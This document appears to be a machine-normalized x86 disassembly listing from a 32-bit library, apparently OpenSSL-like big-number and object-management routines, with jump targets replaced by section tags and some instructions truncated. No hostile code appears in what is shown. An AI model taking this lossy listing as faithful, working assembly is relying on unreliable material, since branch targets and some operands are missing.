je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
push esi
push 0x0
call [ esi + 0x20 ]
add esp 0x8
test eax eax
jne r-xdata
mov [ esi + 0x68 ] 0x0
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
push edi
push eax
call sub_10028330
add esp 0x8
test eax eax
jne r-xdata
push esi
push 0x0
call [ esi + 0x20 ]
add esp 0x8
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
jge r-xdata
mov [ esi + 0x5c ] 0x10
jmp r-xdata
mov [ esi + 0x5c ] 0xc
test ebx ebx
je r-xdata
push esi
push 0x0
call [ esi + 0x20 ]
add esp 0x8
test eax eax
jne r-xdata
sub_10028be0
push ebx
push ebp
push esi
mov esi [ esp + 0x10 ]
push edi
xor ebp ebp
mov eax [ esi + 0x4c ]
mov edi [ esi + 0x58 ]
push eax
call sub_1001e7b0
add esp 0x4
dec eax
cmp edi eax
jge r-xdata
mov edx [ esi + 0x4c ]
push eax
push edx
call sub_1001e7c0
mov ebx eax
push ebx
push ebx
push esi
call [ esi + 0x28 ]
add esp 0x14
test eax eax
jne r-xdata
mov ecx [ esi + 0x4c ]
inc edi
push edi
push ecx
call sub_1001e7c0
add esp 0x8
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
push esi
push eax
mov [ esi + 0x5c ] 0x21
call [ esi + 0x20 ]
mov edi eax
add esp 0x8
test edi edi
je r-xdata
mov ecx [ esp + 0x18 ]
push 0x1
push ecx
push esi
call sub_10028b10
mov edi eax
add esp 0xc
test edi edi
je r-xdata
mov cl [ ebx + 0x28 ]
mov al 0x2
test al cl
je r-xdata
push ebp
call sub_10023940
add esp 0x4
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
retn
mov edi 0x1
push ebx
call sub_10021790
mov ebp eax
add esp 0x4
test ebp ebp
jne r-xdata
test [ ebx + 0x2c ] al
jne r-xdata
mov eax [ esp + 0x18 ]
push ebp
push eax
call sub_1002f6b0
add esp 0x8
test eax eax
jg r-xdata
push esi
push eax
mov [ esi + 0x5c ] 0x6
call [ esi + 0x20 ]
mov edi eax
add esp 0x8
test edi edi
je r-xdata
push esi
push 0x0
mov [ esi + 0x5c ] 0x23
call [ esi + 0x20 ]
mov edi eax
add esp 0x8
test edi edi
je r-xdata
push esi
push 0x0
mov [ esi + 0x5c ] 0x8
call [ esi + 0x20 ]
mov edi eax
add esp 0x8
test edi edi
je r-xdata
jmp r-xdata
sub_10028cf0
mov eax 0x10
call sub_1001d0d0
mov eax [ esp + 0x1c ]
push ebx
push esi
push edi
push eax
call sub_1002b5c0
mov esi [ esp + 0x28 ]
mov [ esp + 0x10 ] eax
mov ecx [ esi ]
mov edx [ ecx + 0x14 ]
push edx
call sub_1001e840
add esp 0x8
test eax eax
jne r-xdata
mov eax [ esi ]
lea edx [ esp + 0xc ]
push edx
mov ecx [ eax + 0x14 ]
push ecx
call sub_1001e620
mov ebx [ esp + 0x28 ]
add esp 0x8
test eax eax
jl r-xdata
push 0x330
push r--data
push 0x6
push 0x9
call sub_1001f5b0
mov eax [ esi ]
mov ecx [ eax + 0x14 ]
push ecx
call sub_1001e810
push 0x332
push r--data
push 0x6
push 0xa
call sub_1001f5b0
add esp 0x24
mov edx [ ebx + 0x14 ]
test [ edx + 0xc ] 0x10
jne r-xdata
push ebx
push 0x0
mov [ ebx + 0x5c ] 0x17
call [ ebx + 0x20 ]
add esp 0x8
test eax eax
jne r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
add esp 0x10
retn
mov eax [ esi ]
xor esi esi
mov edi [ eax + 0x18 ]
push edi
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
pop edi
pop esi
pop ebx
add esp 0x10
retn
push esi
push edi
call sub_1001e7c0
mov ecx [ eax + 0x4 ]
add esp 0x8
test ecx ecx
jg r-xdata
push ebx
push 0x0
mov [ ebx + 0x5c ] 0x24
call [ ebx + 0x20 ]
add esp 0x8
test eax eax
jne r-xdata
push edi
inc esi
call sub_1001e7b0
add esp 0x4
cmp esi eax
jl r-xdata
pop edi
pop esi
pop ebx
add esp 0x10
retn
sub_10028df0
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0x14 ]
mov ecx [ eax + 0xc ]
mov edx [ eax + 0x1c ]
mov eax [ esi + 0x4c ]
push ecx
push edx
lea ecx [ esi + 0x54 ]
push eax
lea edx [ esi + 0x50 ]
push ecx
push edx
call sub_10048920
xor ecx ecx
add esp 0x14
cmp eax ecx
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
push 0x361
push r--data
push 0x41
push 0x91
push 0xb
call sub_1001de60
add esp 0x14
xor eax eax
pop esi
retn
cmp eax 0xfffffffe
jne r-xdata
mov eax [ esi + 0x4c ]
push edi
push eax
mov edi 0x1
call sub_1001e7b0
add esp 0x4
cmp eax edi
jle r-xdata
mov eax [ esi + 0x14 ]
mov edx [ eax + 0xc ]
test dh 0x8
je r-xdata
push esi
push ecx
mov [ esi + 0x60 ] ecx
mov [ esi + 0x5c ] 0x2b
call [ esi + 0x20 ]
add esp 0x8
pop esi
retn
pop edi
mov eax 0x1
pop esi
retn
mov ecx [ esi + 0x4c ]
push edi
push ecx
call sub_1001e7c0
mov ecx [ eax + 0x28 ]
add esp 0x8
test ch 0x8
je r-xdata
mov eax 0x1
pop esi
retn
push esi
push 0x2
mov [ esi + 0x60 ] ecx
mov [ esi + 0x5c ] ecx
call [ esi + 0x20 ]
add esp 0x8
test eax eax
jne r-xdata
mov edx [ esi + 0x4c ]
inc edi
push edx
call sub_1001e7b0
add esp 0x4
cmp edi eax
jl r-xdata
push esi
push 0x0
mov [ esi + 0x60 ] eax
mov [ esi + 0x5c ] 0x2a
call [ esi + 0x20 ]
add esp 0x8
pop esi
retn
sub_10028ee0
push esi
mov esi [ esp + 0x8 ]
push edi
xor edi edi
mov eax [ esi + 0x40 ]
cmp eax edi
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax edi
je r-xdata
push esi
call eax
add esp 0x4
mov eax [ esi + 0x50 ]
cmp eax edi
je r-xdata
push eax
call sub_1001f960
add esp 0x4
mov [ esi + 0x14 ] edi
mov eax [ esi + 0x4c ]
cmp eax edi
je r-xdata
push eax
call sub_10048860
add esp 0x4
mov [ esi + 0x50 ] edi
lea edi [ esi + 0x6c ]
push edi
push esi
push 0x5
call sub_1001f490
xor eax eax
add esp 0xc
mov [ edi ] eax
mov [ edi + 0x4 ] eax
pop edi
pop esi
retn
push sub_10022870
push eax
call sub_1001e730
add esp 0x8
mov [ esi + 0x4c ] edi
sub_10028f60
mov eax [ esp + 0x8 ]
push eax
call sub_1001fb20
add esp 0x4
test eax eax
jne r-xdata
mov ecx [ esp + 0x4 ]
push eax
mov edx [ ecx + 0x14 ]
push edx
call sub_1001f9b0
add esp 0x8
retn
retn
sub_10028f90
push 0x49
push r--data
push 0x20
call sub_1001d4c0
xor ecx ecx
add esp 0xc
cmp eax ecx
jne r-xdata
mov [ eax ] 0x1
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
mov [ eax + 0x14 ] 0x4
mov [ eax + 0x18 ] 0x1
mov [ eax + 0x1c ] ecx
retn
push 0x4c
push r--data
push 0x41
push 0xb6
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
retn
sub_10028ff0
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
push 0x6f
push r--data
push 0x21
lea eax [ esi + 0x18 ]
push 0xffffffff
push eax
call sub_1001f5f0
add esp 0x14
test eax eax
jg r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push eax
call sub_1002c3f0
add esp 0x4
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call sub_1002d200
add esp 0x4
lea ecx [ esi + 0x1c ]
push ecx
call sub_1002d110
push 0x20
push esi
call sub_10026870
push esi
call sub_1001d740
add esp 0x10
push eax
call sub_100298f0
add esp 0x4
sub_10029060
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x14 ]
test edi edi
je r-xdata
push 0x90
push r--data
push 0x43
push 0xb2
push 0x10
call sub_1001de60
add esp 0x14
mov ebx [ esp + 0x18 ]
test ebx ebx
je r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
push eax
call sub_1002c960
mov esi eax
mov eax [ edi + 0x4 ]
add esp 0x4
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push esi
call sub_1002c320
add esp 0x4
mov [ edi + 0x4 ] eax
test eax eax
je r-xdata
push eax
call sub_1002c3f0
add esp 0x4
lea ebp [ edi + 0x1c ]
push ebp
call sub_1002d110
mov esi [ ebx + 0x1c ]
add esp 0x4
test esi esi
je r-xdata
mov eax [ edi + 0xc ]
test eax eax
jne r-xdata
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov ecx [ ebx + 0x4 ]
push ecx
push eax
call sub_1002c570
add esp 0x8
test eax eax
je r-xdata
mov eax [ ebx + 0x10 ]
mov [ edi + 0x10 ] eax
mov ecx [ ebx + 0x14 ]
mov [ edi + 0x14 ] ecx
mov edx [ ebx ]
mov [ edi ] edx
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
retn
mov ecx [ esi + 0x4 ]
push ecx
call [ esi + 0x8 ]
add esp 0x4
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ edi + 0xc ]
push edx
push eax
call sub_10029bf0
add esp 0x8
test eax eax
je r-xdata
call sub_100299b0
test eax eax
mov [ edi + 0xc ] eax
je r-xdata
mov edx [ ebx + 0x4 ]
push edx
call sub_1002d150
add esp 0x4
mov [ edi + 0x8 ] eax
test eax eax
je r-xdata
push eax
call sub_1002d200
add esp 0x4
mov edx [ esi + 0x10 ]
mov ecx [ esi + 0xc ]
push edx
mov edx [ esi + 0x8 ]
push ecx
push edx
push eax
push ebp
call sub_1002cfc0
add esp 0x14
test eax eax
je r-xdata
mov ecx [ ebx + 0x8 ]
push ecx
push eax
call sub_1002d270
add esp 0x8
test eax eax
je r-xdata
mov esi [ esi ]
test esi esi
jne r-xdata
sub_100291c0
push ebx
push ebp
push esi
push edi
push 0x49
push r--data
push 0x20
call sub_1001d4c0
mov esi eax
xor ebx ebx
add esp 0xc
cmp esi ebx
jne r-xdata
mov eax [ esp + 0x14 ]
lea edi [ esi + 0x18 ]
lea ebp [ esi + 0x1c ]
push eax
push esi
mov [ esi ] 0x1
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] 0x4
mov [ edi ] 0x1
mov [ ebp ] ebx
call sub_10029060
add esp 0x8
test eax eax
jne r-xdata
push 0x4c
push r--data
push 0x41
push 0xb6
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
retn
push 0x6f
push r--data
push 0x21
push 0xffffffff
push edi
call sub_1001f5f0
add esp 0x14
test eax eax
jg r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov eax [ esi + 0x4 ]
cmp eax ebx
je r-xdata
mov eax [ esi + 0x8 ]
cmp eax ebx
je r-xdata
push eax
call sub_1002c3f0
add esp 0x4
mov eax [ esi + 0xc ]
cmp eax ebx
je r-xdata
push eax
call sub_1002d200
add esp 0x4
push ebp
call sub_1002d110
push 0x20
push esi
call sub_10026870
push esi
call sub_1001d740
add esp 0x10
push eax
call sub_100298f0
add esp 0x4
sub_100292b0
mov eax [ esp + 0x4 ]
push 0xdb
push r--data
push 0x21
add eax 0x18
push 0x1
push eax
call sub_1001f5f0
add esp 0x14
xor ecx ecx
cmp eax 0x1
setg cl
mov eax ecx
retn
sub_100292e0
mov eax 0x4
call sub_1001d0d0
push ebx
push esi
mov esi [ esp + 0x10 ]
push edi
xor ebx ebx
xor edi edi
cmp esi ebx
mov [ esp + 0xc ] ebx
je r-xdata
push 0xf2
push r--data
push 0x43
push 0xb3
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebx
pop ecx
retn
cmp [ esi + 0x4 ] ebx
je r-xdata
push ebp
call sub_100299b0
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ esp + 0x10 ]
pop ebp
pop edi
pop esi
pop ebx
pop ecx
retn
call sub_1002dc50
test eax eax
mov [ esp + 0x18 ] eax
je r-xdata
push ebp
call sub_10029950
add esp 0x4
test ebx ebx
je r-xdata
mov edi [ esi + 0xc ]
test edi edi
jne r-xdata
test edi edi
je r-xdata
mov eax [ esi + 0x8 ]
test eax eax
jne r-xdata
push eax
mov eax [ esi + 0x4 ]
push ebp
push eax
call sub_1002cb20
add esp 0xc
test eax eax
je r-xdata
call sub_100299b0
mov edi eax
test edi edi
je r-xdata
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
jne r-xdata
push ebx
call sub_1002d200
add esp 0x4
push ebp
push edi
call sub_100494a0
add esp 0x8
test eax eax
je r-xdata
mov eax [ esp + 0x18 ]
push eax
call sub_1002dcb0
add esp 0x4
push edi
call sub_10029950
add esp 0x4
mov eax [ edi + 0x4 ]
test eax eax
jne r-xdata
mov ebx [ esi + 0x8 ]
test ebx ebx
jne r-xdata
push ebp
push edi
call sub_100494a0
add esp 0x8
test eax eax
jne r-xdata
mov edx [ esp + 0x18 ]
mov eax [ esi + 0x4 ]
push edx
push 0x0
push 0x0
push edi
push ebx
push eax
call sub_1002db90
add esp 0x18
test eax eax
je r-xdata
mov ecx [ esi + 0x4 ]
push ecx
call sub_1002d150
mov ebx eax
add esp 0x4
test ebx ebx
je r-xdata
jmp r-xdata
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] ebx
mov [ esp + 0x10 ] 0x1
sub_10029430
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ esp + 0xc ]
push eax
call sub_1002c890
add esp 0x4
xor ecx ecx
test eax eax
setne cl
mov [ esi + 0x4 ] eax
mov eax ecx
pop esi
retn
push eax
call sub_1002c3f0
add esp 0x4
sub_10029460
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ esp + 0xc ]
push eax
push ecx
call sub_1002d2e0
add esp 0x8
xor edx edx
test eax eax
setne dl
mov [ esi + 0x8 ] eax
mov eax edx
pop esi
retn
push eax
call sub_1002d200
add esp 0x4
sub_100294c0
push ebx
push ebp
push esi
push edi
push 0x1b7
push r--data
push 0x21
push 0x9
call sub_1001f5b0
mov eax [ esp + 0x24 ]
mov edi [ esp + 0x34 ]
mov ebx [ esp + 0x30 ]
mov ebp [ esp + 0x2c ]
mov ecx [ eax + 0x1c ]
lea esi [ eax + 0x1c ]
push edi
push ebx
push ebp
push ecx
call sub_1002d070
add esp 0x20
test eax eax
jne r-xdata
push 0x1bb
push r--data
push 0x21
push 0xa
call sub_1001f5b0
add esp 0x10
pop edi
pop esi
pop ebp
pop ebx
retn
mov edx [ esp + 0x18 ]
push edi
push ebx
push ebp
push edx
push esi
call sub_1002cfc0
add esp 0x14
sub_10029540
push ebx
push esi
push edi
push 0x92
push r--data
push 0x58
call sub_1001d4c0
mov esi eax
xor edi edi
add esp 0xc
cmp esi edi
jne r-xdata
mov eax [ rw-data ]
cmp eax edi
jne r-xdata
push 0x95
push r--data
push 0x41
push 0x6a
push 0x4
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebx
retn
mov ebx [ esp + 0x10 ]
mov [ esi + 0x8 ] eax
cmp ebx edi
je r-xdata
call sub_10049680
mov [ rw-data ] eax
call sub_1004aaf0
mov [ esi + 0xc ] eax
push ebx
call sub_100225b0
add esp 0x4
test eax eax
jne r-xdata
mov ecx [ esi + 0x8 ]
lea ebx [ esi + 0x30 ]
mov [ esi ] edi
mov [ esi + 0x4 ] edi
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
mov [ esi + 0x28 ] edi
mov [ esi + 0x2c ] edi
mov [ esi + 0x38 ] 0x1
mov [ esi + 0x40 ] edi
mov [ esi + 0x44 ] edi
mov [ esi + 0x48 ] edi
mov [ esi + 0x50 ] edi
mov [ esi + 0x54 ] edi
mov [ esi + 0x4c ] edi
mov edx [ ecx + 0x24 ]
push ebx
push esi
push 0x6
mov [ esi + 0x3c ] edx
call sub_1001f420
mov eax [ esi + 0x8 ]
add esp 0xc
mov eax [ eax + 0x1c ]
cmp eax edi
je r-xdata
push eax
call sub_1002b600
add esp 0x4
cmp eax edi
mov [ esi + 0x8 ] eax
jne r-xdata
mov [ esi + 0xc ] ebx
jmp r-xdata
push 0x9f
push r--data
push 0x26
push 0x6a
push 0x4
call sub_1001de60
push esi
call sub_1001d740
add esp 0x18
xor eax eax
pop edi
pop esi
pop ebx
retn
mov eax esi
pop edi
pop esi
pop ebx
retn
push esi
call eax
add esp 0x4
test eax eax
jne r-xdata
push 0xad
push r--data
push 0x26
push 0x6a
push 0x4
call sub_1001de60
mov eax [ esi + 0xc ]
push eax
call sub_10022640
push esi
call sub_1001d740
add esp 0x1c
xor eax eax
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0xc ]
cmp eax edi
je r-xdata
mov eax [ esi + 0xc ]
cmp eax edi
je r-xdata
push ebx
push esi
push 0x6
call sub_1001f490
push esi
call sub_1001d740
add esp 0x10
xor esi esi
push eax
call sub_10022640
add esp 0x4
sub_100296b0
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
push 0xe7
push r--data
push 0x9
lea eax [ esi + 0x38 ]
push 0xffffffff
push eax
call sub_1001f5f0
add esp 0x14
test eax eax
jg r-xdata
mov ecx [ esi + 0x8 ]
mov eax [ ecx + 0x20 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push esi
call eax
add esp 0x4
lea edx [ esi + 0x30 ]
push edx
push esi
push 0x6
call sub_1001f490
mov eax [ esi + 0x10 ]
add esp 0xc
test eax eax
je r-xdata
push eax
call sub_10022640
add esp 0x4
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
push eax
call sub_100298f0
add esp 0x4
mov eax [ esi + 0x18 ]
test eax eax
je r-xdata
push eax
call sub_100298f0
add esp 0x4
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
push eax
call sub_100298f0
add esp 0x4
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
push eax
call sub_100298f0
add esp 0x4
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
push eax
call sub_100298f0
add esp 0x4
mov eax [ esi + 0x28 ]
test eax eax
je r-xdata
push eax
call sub_100298f0
add esp 0x4
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call sub_100298f0
add esp 0x4
mov eax [ esi + 0x50 ]
test eax eax
je r-xdata
push eax
call sub_100298f0
add esp 0x4
mov eax [ esi + 0x54 ]
test eax eax
je r-xdata
push eax
call sub_10036b90
add esp 0x4
mov eax [ esi + 0x4c ]
test eax eax
je r-xdata
push eax
call sub_10036b90
add esp 0x4
push esi
call sub_1001d740
add esp 0x4
push eax
call sub_1001d480
add esp 0x4
sub_100297d0
mov eax [ esp + 0x4 ]
push 0x10d
push r--data
push 0x9
add eax 0x38
push 0x1
push eax
call sub_1001f5f0
add esp 0x14
xor ecx ecx
cmp eax 0x1
setg cl
mov eax ecx
retn
sub_10029820
mov eax [ esp + 0x4 ]
test eax 0xffff0000
je r-xdata
test ah 0xff
je r-xdata
test eax 0xff000000
je r-xdata
movsx eax [ eax + r--data ]
retn
shr eax 0x8
movsx eax [ eax + r--data ]
add eax 0x8
retn
shr eax 0x10
movsx eax [ eax + r--data ]
add eax 0x10
retn
shr eax 0x18
movsx eax [ eax + r--data ]
add eax 0x18
retn
sub_10029870
mov edx [ esp + 0x4 ]
mov ecx [ edx + 0x4 ]
test ecx ecx
lea eax [ ecx - 0x1 ]
jne r-xdata
mov ecx [ edx ]
mov ecx [ ecx + eax * 4 ]
test ecx 0xffff0000
je r-xdata
xor eax eax
retn
test ch 0xff
je r-xdata
test ecx 0xff000000
je r-xdata
movsx ecx [ ecx + r--data ]
shl eax 0x5
add eax ecx
retn
shr ecx 0x8
shl eax 0x5
movsx ecx [ ecx + r--data ]
add ecx 0x8
add eax ecx
retn
shr ecx 0x10
shl eax 0x5
movsx ecx [ ecx + r--data ]
add ecx 0x10
add eax ecx
retn
shr ecx 0x18
shl eax 0x5
movsx ecx [ ecx + r--data ]
add ecx 0x18
add eax ecx
retn
sub_100298f0
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
mov eax [ esi ]
test eax eax
je r-xdata
push edi
mov edi [ esi + 0x10 ]
push 0x14
push esi
and edi 0x1
call sub_10026870
add esp 0x8
test edi edi
pop edi
je r-xdata
mov ecx [ esi + 0x8 ]
shl ecx 0x2
push ecx
push eax
call sub_10026870
mov al [ esi + 0x10 ]
add esp 0x8
test al 0x2
jne r-xdata
push esi
call sub_1001d740
add esp 0x4
mov edx [ esi ]
push edx
call sub_1001d740
add esp 0x4
sub_10029950
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi + 0x10 ]
test al 0x1
je r-xdata
test [ esi + 0x10 ] 0x2
jne r-xdata
or ah 0x80
mov [ esi ] 0x0
mov [ esi + 0x10 ] eax
push esi
call sub_1001d740
add esp 0x4
pop esi
retn
push eax
call sub_1001d740
add esp 0x4
sub_100299b0
push 0x11b
push r--data
push 0x14
call sub_1001d4c0
xor ecx ecx
add esp 0xc
cmp eax ecx
jne r-xdata
mov [ eax + 0x10 ] 0x1
mov [ eax + 0x4 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax ] ecx
retn
push 0x11d
push r--data
push 0x41
push 0x71
push 0x3
call sub_1001de60
add esp 0x14
xor eax eax
retn
sub_10029a00
mov eax [ esp + 0x8 ]
push esi
cmp eax 0xffffff
jle r-xdata
mov esi [ esp + 0x8 ]
test [ esi + 0x10 ] 0x2
je r-xdata
push 0x135
push r--data
push 0x72
push 0x78
push 0x3
call sub_1001de60
add esp 0x14
xor eax eax
pop esi
retn
push 0x13d
push r--data
shl eax 0x2
push eax
call sub_1001d4c0
add esp 0xc
mov [ esp + 0xc ] eax
test eax eax
jne r-xdata
push 0x13a
push r--data
push 0x69
push 0x78
push 0x3
call sub_1001de60
add esp 0x14
xor eax eax
pop esi
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
push 0x140
push r--data
push 0x41
push 0x78
push 0x3
call sub_1001de60
add esp 0x14
xor eax eax
pop esi
retn
mov eax [ esp + 0xc ]
pop esi
retn
push ebx
mov ebx [ esi + 0x4 ]
sar ebx 0x2
test ebx ebx
jle r-xdata
mov edx [ esi + 0x4 ]
pop ebx
and edx 0x3
dec edx
je r-xdata
push ebp
push edi
mov ecx [ ecx ]
mov [ eax ] ecx
dec edx
je r-xdata
mov edx [ ecx + 0x4 ]
mov esi [ ecx + 0x8 ]
mov edi [ ecx + 0xc ]
mov ebp [ ecx ]
mov [ eax ] ebp
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] esi
mov [ eax + 0xc ] edi
add eax 0x10
add ecx 0x10
dec ebx
jne r-xdata
mov esi [ esp + 0x14 ]
pop edi
pop ebp
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
dec edx
jne r-xdata
mov edx [ ecx + 0x8 ]
mov [ eax + 0x8 ] edx
sub_10029af0
push ebx
mov ebx [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
push edi
cmp ebx [ esi + 0x8 ]
jle r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
push ebx
push esi
call sub_10029a00
mov edi eax
add esp 0x8
test edi edi
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi ] edi
mov [ esi + 0x8 ] ebx
push eax
call sub_1001d740
add esp 0x4
sub_10029b30
push ebp
mov ebp [ esp + 0x8 ]
test ebp ebp
push esi
jne r-xdata
push 0x11b
push r--data
push 0x14
call sub_1001d4c0
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
pop esi
xor eax eax
pop ebp
retn
push ebp
push esi
mov [ esi + 0x10 ] 0x1
mov [ esi + 0x4 ] 0x0
mov [ esi + 0xc ] 0x0
mov [ esi + 0x8 ] 0x0
mov [ esi ] 0x0
call sub_10029bf0
add esp 0x8
test eax eax
jne r-xdata
push 0x11d
push r--data
push 0x41
push 0x71
push 0x3
call sub_1001de60
add esp 0x14
xor eax eax
pop esi
pop ebp
retn
mov eax esi
pop esi
pop ebp
retn
mov eax [ esi ]
test eax eax
je r-xdata
test [ esi + 0x10 ] 0x1
je r-xdata
test [ esi + 0x10 ] 0x2
jne r-xdata
mov eax [ esi + 0x10 ]
mov [ esi ] 0x0
or ah 0x80
mov [ esi + 0x10 ] eax
pop esi
xor eax eax
pop ebp
retn
push esi
call sub_1001d740
add esp 0x4
xor eax eax
pop esi
pop ebp
retn
push eax
call sub_1001d740
add esp 0x4
sub_10029bf0
push ebx
mov ebx [ esp + 0x8 ]
push ebp
push esi
push edi
mov edi [ esp + 0x18 ]
cmp ebx edi
je r-xdata
pop edi
pop esi
mov eax ebx
pop ebp
pop ebx
retn
mov esi [ edi + 0x4 ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
test ebx ebx
jne r-xdata
push esi
push ebx
call sub_10029a00
mov ebp eax
add esp 0x8
test ebp ebp
je r-xdata
mov edx [ edi + 0x4 ]
mov eax [ ebx ]
mov ecx [ edi ]
sar edx 0x2
test edx edx
jle r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov eax [ ebx ]
test eax eax
je r-xdata
mov edx [ edi + 0x4 ]
and edx 0x3
dec edx
je r-xdata
mov [ esp + 0x14 ] edx
mov [ ebx ] ebp
mov [ ebx + 0x8 ] esi
push eax
call sub_1001d740
add esp 0x4
mov ecx [ ecx ]
mov [ eax ] ecx
dec edx
je r-xdata
mov edx [ ecx + 0x4 ]
mov esi [ ecx + 0x8 ]
mov edi [ ecx + 0xc ]
mov ebp [ ecx ]
mov [ eax + 0x4 ] edx
mov edx [ esp + 0x14 ]
mov [ eax ] ebp
mov [ eax + 0x8 ] esi
mov [ eax + 0xc ] edi
add eax 0x10
add ecx 0x10
dec edx
mov [ esp + 0x14 ] edx
jne r-xdata
mov edi [ esp + 0x18 ]
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
dec edx
jne r-xdata
mov edx [ edi + 0x4 ]
mov [ ebx + 0x4 ] edx
mov eax [ edi + 0xc ]
mov [ ebx + 0xc ] eax
mov edx [ ecx + 0x8 ]
mov [ eax + 0x8 ] edx
sub_10029cb0
mov edx [ esp + 0x4 ]
push esi
push edi
xor esi esi
mov edi [ edx ]
cmp edi esi
je r-xdata
mov [ edx + 0x4 ] esi
mov [ edx + 0xc ] esi
pop edi
pop esi
retn
mov ecx [ edx + 0x8 ]
push ebx
shl ecx 0x2
mov ebx ecx
xor eax eax
shr ecx 0x2
[ edi ]
mov ecx ebx
pop ebx
and ecx 0x3
[ edi ]
mov [ edx + 0x4 ] esi
mov [ edx + 0xc ] esi
pop edi
pop esi
retn
sub_10029cf0
push esi
mov esi [ esp + 0x8 ]
push edi
cmp [ esi + 0x8 ] 0x1
jge r-xdata
test esi esi
jne r-xdata
push 0x1
push esi
call sub_10029a00
mov edi eax
add esp 0x8
test edi edi
je r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ esi ]
xor edx edx
mov [ esi + 0xc ] 0x0
test eax eax
setne dl
mov [ ecx ] eax
mov [ esi + 0x4 ] edx
pop edi
mov eax 0x1
pop esi
retn
pop edi
xor eax eax
pop esi
retn
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] edi
mov [ esi + 0x8 ] 0x1
push eax
call sub_1001d740
add esp 0x4
sub_10029d50
mov eax 0x4
call sub_1001d0d0
push ebx
push ebp
push esi
mov esi [ esp + 0x1c ]
xor ebx ebx
xor eax eax
cmp esi ebx
push edi
mov [ esp + 0x10 ] eax
jne r-xdata
mov ecx [ esp + 0x1c ]
cmp ecx ebx
jne r-xdata
push 0x11b
push r--data
push 0x14
call sub_1001d4c0
add esp 0xc
cmp eax ebx
jne r-xdata
mov edx [ esi + 0x8 ]
dec ecx
mov edi ecx
mov ebp ecx
shr edi 0x2
inc edi
and ebp 0x3
cmp edi edx
mov [ esp + 0x1c ] ecx
jle r-xdata
mov [ esi + 0x4 ] ebx
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov [ eax + 0x10 ] 0x1
mov [ eax + 0x4 ] ebx
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] ebx
mov [ eax ] ebx
mov [ esp + 0x10 ] eax
mov esi eax
push 0x11d
push r--data
push 0x41
push 0x71
push 0x3
call sub_1001de60
add esp 0x14
xor esi esi
mov [ esp + 0x10 ] esi
jmp r-xdata
test esi esi
